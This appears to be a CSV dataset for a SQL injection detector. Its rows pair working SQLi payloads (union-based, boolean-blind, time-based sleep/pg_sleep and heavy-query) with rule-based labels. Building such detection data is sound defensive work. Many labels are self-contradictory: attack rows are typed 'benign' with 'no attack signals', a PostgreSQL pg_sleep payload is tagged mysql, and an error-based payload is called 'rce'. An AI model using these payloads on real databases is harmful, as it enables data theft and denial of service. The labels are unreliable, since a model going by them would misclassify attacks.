row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2640,"1"" ) ) as thoj where 1577 = 1577 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1577 = 1577 or detected — boolean_blind injection (priority 8) on generic,rule-based
2641,1' where 9216 = 9216,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2642,"-4772 ) ) ) union all select 3879,3879,3879,3879,3879--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2643,"select * from generate_series ( 5206,5206,case when ( 5206 = 2214 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
2644,"1' in boolean mode ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2645,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""ouix"" = ""ouix",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2646,"1"" ) as giqb where 4664 = 4664",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2647,1' and 7528 = 2894 and 'qoyw' = 'qoyw,1,,boolean_blind,generic,0.95,7528 = 2894 and detected — boolean_blind injection (priority 8) on generic,rule-based
2648,"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2649,"select count ( * ) from generate_series ( 1,5000000 ) and 'roca' = 'roca",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2650,"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2651,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2652,"1"" and 9198 = 9198--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2653,1 ) as azoo where 8933 = 8933 and ( 3020 = 3020 ) *6703--,1,,boolean_blind,generic,0.95,8933 = 8933 and detected — boolean_blind injection (priority 8) on generic,rule-based
2654,1'|| ( select 'hbho' from dual where 7193 = 7193,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2655,1' ) ) ) rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2656,1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,3900 = 3900 and detected — boolean_blind injection (priority 8) on generic,rule-based
2657,"-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2658,"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *9586--",1,,boolean_blind,generic,0.95,9460 = 9460 or detected — boolean_blind injection (priority 8) on generic,rule-based
2659,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'pemj' = 'pemj,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2660,"1%' ) ) union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2661,"1' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'agsi' = 'agsi",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2662,"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
